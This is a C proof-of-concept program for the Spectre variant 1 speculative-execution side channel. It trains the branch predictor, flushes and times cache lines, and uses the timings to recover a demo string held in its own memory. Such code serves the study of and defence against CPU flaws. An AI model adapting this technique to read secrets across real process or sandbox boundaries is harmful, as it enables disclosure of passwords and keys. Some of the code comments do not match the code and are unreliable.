//Build with Visual Studio command prompt: cl.exe spectre.c
//Build with GCC: gcc spectre.c

#ifdef _MSC_VER
#include <intrin.h>
#pragma optimize("gt",on)
#else
#include <x86intrin.h>
#endif
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#define PAGE_NUM            256
#define CACHE_HIT_THRESHOLD 100

uint8_t array[16] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t mem_pages[PAGE_NUM][4096];

void do_speculative_execution(size_t index)
{
    _mm_clflush(array);
    for (volatile int z = 0; z < 100; z++);
    
    if (index < sizeof(array))
    {
        mem_pages[array[index]][0] = 0;
    }
}

void speculative_execution(uint8_t* target, int tries)
{
    register int offset_to_array = (target - array);
    register size_t training_x, index;
    training_x = tries % sizeof(array);
    for (int i = 0; i < 60; i++)
    {
        index = ((i % (sizeof(array)/2)) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
        index = (index | (index >> sizeof(array))); /* Set x=-1 if j&6=0, else x=0 */
        index = training_x ^ (index & (offset_to_array ^ training_x));
        do_speculative_execution(index);
    }
}

int get_access_time(uint8_t* page)
{
    unsigned long long tick1, tick2;
    unsigned int aux;

    tick1 = __rdtscp(&aux);
    uint8_t tmp = *page;
    tick2 = __rdtscp(&aux);
    
    return (tick2 - tick1);
}

void detect_cached_page(int results[PAGE_NUM])
{
    int min_time = 500;
    int cached_page_index = -1;
    for (int i = 0; i < PAGE_NUM; i++)
    {
        //Order is lightly mixed up to prevent stride prediction
        int mixed_i = ((i * 167) + 13) & 255;
        int access_time = get_access_time(mem_pages[mixed_i]);
        if (min_time > access_time)
        {
            min_time = access_time;
            cached_page_index = mixed_i;
        }
    }

    if(-1 != cached_page_index)
    {
        results[cached_page_index]++;
    }
}

uint8_t get_best_result(int results[PAGE_NUM])
{
    uint8_t ret = '?';
    int max = 0;
    for (int i = 0; i < PAGE_NUM; i++)
    {
        if (results[i] > max)
        {   
            max = results[i];
            ret = i;
        }
    }

    if(ret < 32 || ret > 126) ret = 'x';
    //printf("%c, score: %d\n", ret, results[ret]);
    return ret;
}

uint8_t probe(uint8_t* target)
{
    int results[PAGE_NUM];
    memset(results, 0, sizeof(results));
    
    for (int tries = 0; tries < 300; tries++)
    {
        for (int i = 0; i < PAGE_NUM; i++)
        {
            _mm_clflush(mem_pages[i]);
        }

        speculative_execution(target, tries);

        detect_cached_page(results);
    }

    return get_best_result(results);
}

char* secret = "Hello";

int main()
{
    memset(mem_pages, 1, sizeof(mem_pages));

    int len = strlen((char*)(secret));

    printf("secret = ");//sleep(1);
    
    for(int i = 0; i < len; i++)
    {
        printf("%c", probe((uint8_t*)&secret[i]));
    }
    printf("\n");
}